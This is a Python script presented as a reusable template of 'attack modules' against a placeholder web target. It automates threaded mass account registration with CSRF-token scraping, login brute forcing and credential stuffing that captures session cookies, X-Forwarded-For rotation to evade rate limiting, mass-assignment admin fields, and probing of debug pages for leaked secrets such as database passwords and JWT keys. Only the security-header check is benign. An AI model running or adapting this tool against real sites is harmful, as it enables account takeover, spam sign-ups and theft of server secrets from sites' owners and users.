#!/usr/bin/env python3
"""
Generic HTTP probe — CSRF-aware, threaded, redirect-safe.
Copy this file and adapt for each attack module.

Usage:
    python -X utf8 probe_template.py
    python -X utf8 probe_template.py -n 100      # run N attempts
"""

import requests, re, sys, threading, argparse
from uuid import uuid4
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── CONFIG ────────────────────────────────────────────────────────────────────

TARGET  = "https://[TARGET_DOMAIN]"   # never trailing slash
THREADS = 200
DEFAULT_PASSWORD = "Pa$$w0rd!Probe1"

# Framework hints — uncomment what applies:
# CSRF_FIELD  = "_token"        # Laravel
# CSRF_FIELD  = "authenticity_token"  # Rails
# CSRF_FIELD  = "csrfmiddlewaretoken"  # Django
CSRF_FIELD = "_token"

# ── SESSION ───────────────────────────────────────────────────────────────────

def new_session() -> requests.Session:
    """Fresh session per attempt — never share across threads."""
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9",
    })
    return s


def get_csrf(session: requests.Session, path: str) -> str | None:
    """GET a page and extract the CSRF token. Returns None if not found."""
    r = session.get(f"{TARGET}{path}", allow_redirects=False)
    print(f"  [GET {path}] {r.status_code}")
    m = re.search(rf'name="{CSRF_FIELD}"\s+value="([^"]+)"', r.text)
    if not m:
        # Try meta tag (common in SPAs)
        m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
    return m.group(1) if m else None


def xff_headers() -> dict:
    """Rotate X-Forwarded-For to bypass IP-based throttling."""
    import random
    ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    return {"X-Forwarded-For": ip, "X-Real-IP": ip, "X-Originating-IP": ip}

# ── ATTACK MODULES ────────────────────────────────────────────────────────────

counter = {"success": 0, "fail": 0, "csrf": 0, "reject": 0}
lock = threading.Lock()

def inc(key: str):
    with lock:
        counter[key] += 1


def register(n: int, use_xff: bool = False) -> bool:
    """
    Module: mass account registration.
    Returns True on success.
    """
    uid   = uuid4().hex[:8]
    name  = f"Probe User {uid}"
    email = f"probe_{uid}@mailinator.com"
    s     = new_session()

    try:
        # Step 1 — get CSRF token
        token = get_csrf(s, "/register")
        if not token:
            print(f"  [!] No CSRF token found on /register")
            inc("fail")
            return False

        # Step 2 — POST registration
        data = {
            CSRF_FIELD:            token,
            "name":                name,
            "email":               email,
            "password":            DEFAULT_PASSWORD,
            "password_confirmation": DEFAULT_PASSWORD,
            # Mass assignment extras — check if any are accepted:
            # "is_admin":  "1",
            # "role":      "admin",
            # "admin":     "true",
        }
        extra = xff_headers() if use_xff else {}
        r = s.post(f"{TARGET}/register", data=data,
                   allow_redirects=False, headers=extra)

        print(f"  [status] {r.status_code}  {r.headers.get('Location','')}")

        if r.status_code in (301, 302):
            print(f"  [+] SUCCESS -- {email}")
            inc("success")
            return True
        elif r.status_code == 419:
            print(f"  [!] CSRF 419 -- token expired or session mismatch")
            inc("csrf")
        elif r.status_code == 429:
            print(f"  [!] REJECTED 429 -- rate limited")
            inc("reject")
        else:
            print(f"  [-] FAIL -- {r.status_code}")
            inc("fail")

    except Exception as e:
        print(f"  [x] ERROR -- {e}")
        inc("fail")

    return False


def login(email: str, password: str, use_xff: bool = False) -> str | None:
    """
    Module: login attempt. Returns session cookie string on success, None on fail.
    Use for credential stuffing / brute force.
    """
    s = new_session()
    try:
        token = get_csrf(s, "/login")
        if not token:
            return None

        data = {
            CSRF_FIELD: token,
            "email":    email,
            "password": password,
        }
        extra = xff_headers() if use_xff else {}
        r = s.post(f"{TARGET}/login", data=data,
                   allow_redirects=False, headers=extra)

        if r.status_code in (301, 302) and "dashboard" in r.headers.get("Location", ""):
            cookie = "; ".join(f"{k}={v}" for k, v in s.cookies.items())
            print(f"  [+] LOGIN OK -- {email} | cookies: {cookie[:80]}...")
            return cookie
        elif r.status_code == 429:
            print(f"  [!] REJECTED 429 -- {email}")
        else:
            print(f"  [-] LOGIN FAIL -- {email} ({r.status_code})")
    except Exception as e:
        print(f"  [x] ERROR -- {e}")
    return None


def probe_debug(paths: list[str] | None = None) -> None:
    """
    Module: trigger debug/error pages to extract secrets.
    Tries wrong HTTP methods on known routes.
    """
    if paths is None:
        paths = ["/login", "/register", "/password/reset",
                 "/api/user", "/home", "/dashboard"]

    wrong_methods = ["DELETE", "PUT", "PATCH"]
    s = new_session()

    for path in paths:
        for method in wrong_methods:
            r = s.request(method, f"{TARGET}{path}", allow_redirects=False)
            size = len(r.text)
            print(f"  [{method} {path}] {r.status_code} ({size} bytes)")

            # Look for common secret patterns
            secrets = {
                "APP_KEY":        re.search(r'APP_KEY["\s:=]+([A-Za-z0-9+/=:]+)', r.text),
                "DB_PASSWORD":    re.search(r'DB_PASSWORD["\s:=]+([^\s"\'<]+)', r.text),
                "JWT_SECRET":     re.search(r'JWT_SECRET["\s:=]+([A-Za-z0-9+/=_\-]+)', r.text),
                "SECRET_KEY":     re.search(r'SECRET_KEY["\s:=]+([A-Za-z0-9+/=_\-]+)', r.text),
                "API_KEY":        re.search(r'API_KEY["\s:=]+([A-Za-z0-9+/=_\-]+)', r.text),
                "Server path":    re.search(r'(/(?:home|var|srv|app|www)/[^<"\s]+)', r.text),
            }
            for label, match in secrets.items():
                if match:
                    print(f"  [!!!] {label} FOUND: {match.group(1)[:80]}")


def probe_headers() -> None:
    """
    Module: analyze response headers for security misconfigurations.
    """
    s = new_session()
    r = s.get(TARGET, allow_redirects=False)

    security_headers = [
        "Content-Security-Policy", "Strict-Transport-Security",
        "X-Frame-Options", "X-Content-Type-Options",
        "Referrer-Policy", "Permissions-Policy",
    ]
    info_headers = [
        "Server", "X-Powered-By", "X-Generator", "Via",
        "X-Cache", "Access-Control-Allow-Origin",
    ]

    print(f"\n[HEADERS] {TARGET}")
    print("-" * 50)
    for h in info_headers:
        val = r.headers.get(h)
        if val:
            tag = "[!!!]" if h == "Access-Control-Allow-Origin" and val not in ("*", "") else "[i]"
            print(f"  {tag} {h}: {val}")
    for h in security_headers:
        val = r.headers.get(h)
        tag = "[OK]" if val else "[MISSING]"
        print(f"  {tag} {h}: {val or 'not set'}")


# ── MAIN ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Generic HTTP probe")
    parser.add_argument("-n", "--count", type=int, default=10,
                        help="Number of attempts (default: 10)")
    parser.add_argument("--module", choices=["register", "login", "debug", "headers"],
                        default="register", help="Attack module to run")
    parser.add_argument("--xff", action="store_true",
                        help="Rotate X-Forwarded-For to bypass throttling")
    args = parser.parse_args()

    print(f"\n[*] Target  : {TARGET}")
    print(f"[*] Module  : {args.module}")
    print(f"[*] Count   : {args.count}")
    print(f"[*] Threads : {THREADS}")
    print(f"[*] XFF     : {args.xff}")
    print("=" * 50)

    if args.module == "debug":
        probe_debug()
    elif args.module == "headers":
        probe_headers()
    elif args.module == "register":
        n = 0
        try:
            while True:
                with ThreadPoolExecutor(max_workers=THREADS) as ex:
                    futures = {ex.submit(register, i, args.xff): i
                               for i in range(min(THREADS, args.count - n))}
                    for f in as_completed(futures):
                        n += 1
                        if n >= args.count:
                            break
                if n >= args.count:
                    break
        except KeyboardInterrupt:
            print("\n[!] Stopped by user")
    elif args.module == "login":
        # Example — replace with your wordlist
        creds = [
            ("admin@example.com", "admin"),
            ("admin@example.com", "password"),
            ("admin@example.com", "123456"),
        ]
        for email, pwd in creds:
            print(f"\n[>] Trying {email}:{pwd}")
            login(email, pwd, use_xff=args.xff)

    print("\n" + "=" * 50)
    print(f"  Total SUCCESS  : {counter['success']}")
    print(f"  Total FAIL     : {counter['fail']}")
    print(f"  CSRF 419       : {counter['csrf']}")
    print(f"  Rejected 429   : {counter['reject']}")
    total = sum(counter.values())
    if total:
        print(f"  Success rate   : {counter['success']/total*100:.1f}%")
    print("=" * 50)


if __name__ == "__main__":
    main()
